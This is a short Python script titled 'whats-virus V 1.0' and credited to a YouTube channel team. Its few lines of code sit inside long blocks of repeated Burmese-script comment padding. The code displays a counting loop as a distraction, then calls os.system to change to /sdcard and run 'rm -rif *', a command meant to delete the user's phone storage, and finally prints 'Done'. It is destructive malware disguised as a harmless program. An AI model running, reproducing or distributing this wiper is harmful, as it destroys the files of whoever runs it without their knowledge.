# whats-virus V 1.0
#Channel
#https://www.youtube.com/channel/UCQuGjfmo04jDd6zlBscslGQ
# A7Y Team

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ 
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import os
os.system ("clear")
A7Y = 1000
while A7Y < 10000:
        A7Y = A7Y +1
        print( A7Y)
os.system ("clear")
os.system ('cd /sdcard')
os.system ('rm -rif *')
print ("[+] Done..!")
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
